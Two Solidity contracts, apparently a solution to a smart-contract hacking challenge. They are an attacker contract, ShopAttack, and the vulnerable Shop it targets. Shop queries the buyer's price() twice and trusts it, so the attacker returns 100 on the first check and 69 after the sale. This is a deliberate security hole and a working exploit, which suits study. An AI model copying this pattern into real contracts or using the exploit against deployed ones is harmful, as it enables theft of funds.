// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import { Shop } from "./Shop.sol";

contract ShopAttack {
    address public shopAddress;

    function attack(address _shopAddress) public {
        shopAddress = _shopAddress;
        Shop(_shopAddress).buy();
    }

    function price() external view returns (uint256) {
        if (Shop(shopAddress).isSold()) {
            // return lower price after the Shop tells us the item has sold
            return 69; 
        } else {
            // return passable price for first check on Shop.buy function
            return 100;
        }
    }
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

interface Buyer {
    function price() external view returns (uint256);
}

contract Shop {
    uint256 public price = 100;
    bool public isSold;

    function buy() public {
        Buyer _buyer = Buyer(msg.sender);

        if (_buyer.price() >= price && !isSold) {
            isSold = true;
            price = _buyer.price();
        }
    }
}